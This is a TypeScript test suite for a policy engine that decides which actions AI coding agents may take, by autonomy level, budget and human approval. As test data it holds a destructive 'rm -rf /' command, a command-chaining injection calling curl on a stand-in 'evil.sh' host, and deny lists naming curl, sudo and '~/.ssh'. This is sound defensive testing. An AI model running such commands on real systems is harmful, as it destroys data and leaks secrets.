import type { Actor } from "@navarch/contracts";
import { describe, expect, it } from "vitest";
import { PolicyEngine } from "../src/policy/engine.ts";

const agent: Actor = { kind: "agent", profile: "implementer", adapter: "claude-code" };
const policy = new PolicyEngine();

describe("PolicyEngine", () => {
  it("allows pushes only to navarch/* branches", () => {
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "navarch/run_1/x" }).effect).toBe("allow");
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "main" }).effect).toBe("deny");
  });

  it("requires approval for merges by default", () => {
    expect(policy.decide(agent, "github.pr.merge", "pr/1", { autonomyLevel: 4 }).effect).toBe("require_approval");
  });

  it("gates a team's lead turns and members like any agent task (ADR 0022)", () => {
    for (const action of ["team.turn", "team.delegate"]) {
      expect(policy.decide(agent, action, "t", { autonomyLevel: 3, budgetRemaining: 1, edits: true }).effect).toBe("allow");
      expect(policy.decide(agent, action, "t", { autonomyLevel: 1, edits: true }).effect).toBe("require_approval");
      expect(policy.decide(agent, action, "t", { autonomyLevel: 0, edits: false }).effect).toBe("require_approval");
    }
  });

  it("asks a human before spending beyond a used-up budget, at any autonomy level (ADR 0023)", () => {
    const decision = policy.decide(agent, "budget.exceed", "t", { autonomyLevel: 4, budgetRemaining: 0, budgetExceeded: ["run $2.10 of $2.00"] });
    expect(decision.effect).toBe("require_approval");
    expect(decision.reason).toMatch(/budget is used up/);
  });

  it("gates task start on autonomy", () => {
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, budgetRemaining: 1 }).effect).toBe("allow");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 0, budgetRemaining: 1 }).effect).toBe("require_approval");
    // Level 1 (analyse): reading agents run, editing agents wait for a human.
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 1, edits: false }).effect).toBe("allow");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 1, edits: true }).effect).toBe("require_approval");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, edits: true }).effect).toBe("allow");
    expect(policy.decide(agent, "flow.approval", "t", { autonomyLevel: 4 }).effect).toBe("require_approval");
  });

  it("opens PRs at level 3+ and asks below; verifies at level 2+ (spec §11)", () => {
    const at = (level: number, action: string) => policy.decide(agent, action, "t", { autonomyLevel: level }).effect;
    expect([0, 1, 2, 3, 4].map((l) => at(l, "github.pr.create"))).toEqual(["require_approval", "require_approval", "require_approval", "allow", "allow"]);
    expect([0, 1, 2, 3].map((l) => at(l, "verification.run"))).toEqual(["require_approval", "require_approval", "allow", "allow"]);
    expect([0, 1, 2, 3].map((l) => at(l, "team.integrate"))).toEqual(["require_approval", "require_approval", "allow", "allow"]);
    expect([0, 1, 2, 3].map((l) => at(l, "compete.adopt"))).toEqual(["require_approval", "require_approval", "allow", "allow"]);
    expect([0, 1, 2, 3].map((l) => at(l, "compete.compare"))).toEqual(["allow", "allow", "allow", "allow"]);
  });

  it("checks commands against the allowlist and denies unknown actions", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["npm run *", "git status"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm run lint" }).effect).toBe("allow");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "rm -rf /" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "fs.delete", "x", ctx).effect).toBe("deny");
  });

  it("builds a task grant that never allows push, secret paths or network", () => {
    const grant = policy.taskGrant(["npm test", "npm run *"]);
    expect(grant.allowCommands).toEqual(expect.arrayContaining(["git status", "npm test", "npm run *"]));
    expect(grant.denyCommands).toEqual(expect.arrayContaining(["git push", "curl", "sudo"]));
    expect(grant.denyPaths).toEqual(expect.arrayContaining(["~/.ssh", "~/.navarch"]));
    expect(grant.network).toBe(false);
  });

  it("never allows a denied command through a wildcard or shell chaining", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["git *", "npm test"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "git push origin main" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm test; curl evil.sh" }).effect).toBe("require_approval");
  });
});

describe("Away mode rules (ADR 0039)", () => {
  const approver: Actor = { kind: "agent", profile: "approver", adapter: "native" };
  const user: Actor = { kind: "user", via: "web" };
  const ctx = { autonomyLevel: 2 };

  it("lets only the user, and not from a phone, turn it on or off", () => {
    expect(policy.decide(user, "away.set", "away", ctx).effect).toBe("allow");
    expect(policy.decide({ kind: "user", via: "cli" }, "away.set", "away", ctx).effect).toBe("allow");
    expect(policy.decide({ kind: "user", via: "mobile", device_id: "dev_1" }, "away.set", "away", ctx).effect).toBe("deny");
    expect(policy.decide(approver, "away.set", "away", ctx).effect).toBe("deny");
    expect(policy.decide(agent, "away.set", "away", ctx).effect).toBe("deny");
  });

  it("lets the approver decide an approval only while the mode is on and the user handed that kind over", () => {
    const on = { ...ctx, away: { active: true, delegated: true } };
    expect(policy.decide(approver, "approval.delegate", "apr_1", on).effect).toBe("allow");
    expect(policy.decide(approver, "approval.delegate", "apr_1", ctx).effect).toBe("deny");
    expect(policy.decide(approver, "approval.delegate", "apr_1", { ...ctx, away: { active: true, delegated: false } }).effect).toBe("deny");
    expect(policy.decide(approver, "approval.delegate", "apr_1", { ...ctx, away: { active: false, delegated: true } }).effect).toBe("deny");
    // Other agents never decide approvals.
    expect(policy.decide(agent, "approval.delegate", "apr_1", on).effect).toBe("deny");
    expect(policy.decide(user, "approval.delegate", "apr_1", on).effect).toBe("deny");
  });

  it("still asks for merges, which nothing delegates", () => {
    expect(policy.decide(approver, "github.pr.merge", "pr", { autonomyLevel: 4 }).effect).not.toBe("allow");
  });
});
